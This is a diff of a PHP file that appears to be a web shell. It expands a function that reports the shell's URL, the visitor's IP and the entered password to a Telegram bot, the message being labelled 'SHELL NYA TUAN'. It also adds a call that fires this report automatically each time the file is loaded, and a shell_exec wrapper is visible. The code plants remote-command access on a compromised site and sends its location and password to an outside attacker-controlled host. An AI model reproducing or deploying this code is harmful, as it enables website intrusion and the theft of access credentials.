@@ -9,9 +9,7 @@ ini_set('display_errors', 1);
 function sendTelegram($domain, $path, $file, $passwordInput) {
     global $botToken, $chatId;
     $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
-    $link = "https://$domain/$path/$file";
-    $msg = "SHELL NYA TUAN
-URL : https://$domain/$path/$file";
+    $msg = "SHELL NYA TUAN\nIP: $ip\nURL : https://$domain/$path/$file\nPASS: $passwordInput";
 
     $data = [
         'chat_id' => $chatId,
@@ -22,8 +20,15 @@ URL : https://$domain/$path/$file";
     curl_setopt($ch, CURLOPT_POST, true);
     curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_exec($ch);
+    $response = curl_exec($ch);
+    $error = curl_error($ch);
     curl_close($ch);
+
+    // Log untuk debug (hapus jika tidak perlu)
+    file_put_contents('/tmp/telegram_log.txt', "RESP:\n$response\nERROR:\n$error");
+}
+if (function_exists('sendTelegram')) {
+    sendTelegram($_SERVER['HTTP_HOST'], trim(dirname($_SERVER['PHP_SELF']), '/'), basename(__FILE__), $_SESSION['password_input'] ?? 'unknown');
 }
 function safe_exec($cmd) {
     // shell_exec
